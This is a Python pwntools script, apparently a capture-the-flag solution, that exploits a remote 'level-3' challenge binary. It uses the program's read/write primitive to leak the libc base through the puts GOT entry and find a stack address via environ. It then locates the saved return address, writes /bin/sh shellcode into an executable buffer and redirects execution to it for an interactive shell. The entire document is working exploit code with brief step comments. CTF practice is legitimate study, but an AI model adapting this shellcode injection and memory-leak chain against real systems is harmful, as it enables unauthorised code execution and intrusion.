#!/usr/bin/env python

from pwn import *

# level 3 program image offsets
puts_got_offset = 0x200f98
executable_buffer_ptr_offset = 0x201030
play_the_game_ret_addr_offset = 0x7ff

# local libc
# offset_puts = 0x68f90
# offset_environ = 0x39bf38
# endpoint = process("level-3")

# remote libc - libc6_2.27-3ubuntu1_amd64
offset_puts = 0x00000000000809c0
offset_environ = 0x00000000003ee098
endpoint = remote("ctf.reversing.io", 32103)

endpoint.recvuntil("Have a pointer: ")
executable_buffer_ptr = int(endpoint.recvline().strip(), 16)
stdin_ptr = executable_buffer_ptr - 16

# get the base address of level3 because it is relro
level3_base = executable_buffer_ptr - executable_buffer_ptr_offset
puts_got = level3_base + puts_got_offset

print("executable_object: 0x{:x}".format(executable_buffer_ptr))
print("level3_base: 0x{:x}".format(level3_base))
print("puts_got: 0x{:x}".format(puts_got))

u64 = make_unpacker(64, endian='little', sign='unsigned')

def finish():
    buf = p8(4)
    endpoint.send(buf)

def write_byte(address, byte):
    buf = p8(1)
    buf += p64(address)
    buf += p8(byte)
    endpoint.send(buf)

def write_bytes(addr, buf):
    for i, byte in enumerate(buf):
        write_byte(addr + i, ord(byte))

def read_byte(address):
    buf = p8(2)
    buf += p64(address)
    endpoint.send(buf)
    return ord(endpoint.recv(1))

def read_ptr(addr):
    return u64(read_bytes(addr, 8))

def read_bytes(addr, length):
    my_bytes = [chr(read_byte(i)) for i in range(addr, addr + length)]
    return "".join(my_bytes)

def unwind_stack_until_predicate(addr, pred):

    print("addr -> {:x} walking . . .".format(addr))
    value = read_ptr(addr)
    while not pred(value):
        addr -= 8
        value = read_ptr(addr)

    return (addr, value)

"""
def get_libc_base():
    offset_puts = 0x68f90
    puts = read_ptr(puts_got)
    return puts - offset_puts
    # return puts & 0xffffffffffffff00
"""

def chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in range(0, len(l), n):
        yield l[i:i + n]

def get_pointers(iter):
    return map(u64, list(chunks(iter, 8)))

if __name__ == "__main__":

    # 1) generate/write out shellcode
    #    executable buffer is roughly generated like this c code below
    #    executable_buffer_ptr = mmap(0, 0x1000, 7, 0x22, i -1, 0)
    payload = asm(shellcraft.amd64.sh(), arch = 'amd64')
    executable_buffer = read_ptr(executable_buffer_ptr)
    print("executable_buffer: {:x}".format(executable_buffer))
    write_bytes(executable_buffer, payload)

    # 2) get libc base address
    puts = read_ptr(puts_got)
    libc_base = puts - offset_puts
    print("libc_base: {:x}".format(libc_base))

    # 3) get environ address 
    environ = libc_base + offset_environ
    print("environ: {:x}".format(environ))

    # 4) read stack address from environ variable
    stack_addr = read_ptr(environ)
    print("stack addr: {:x}".format(stack_addr))

    def equals_ptg_ret_addr(value):
        return value == (level3_base + play_the_game_ret_addr_offset)

    # 5) read stack values until we find saved return address on stack
    (addr, _) = unwind_stack_until_predicate(stack_addr, equals_ptg_ret_addr)
    print("play_the_game_ret_addr: {:x}".format(addr))

    # 6) corrupt stack address
    write_bytes(addr, p64(executable_buffer))

    finish()
    endpoint.interactive()
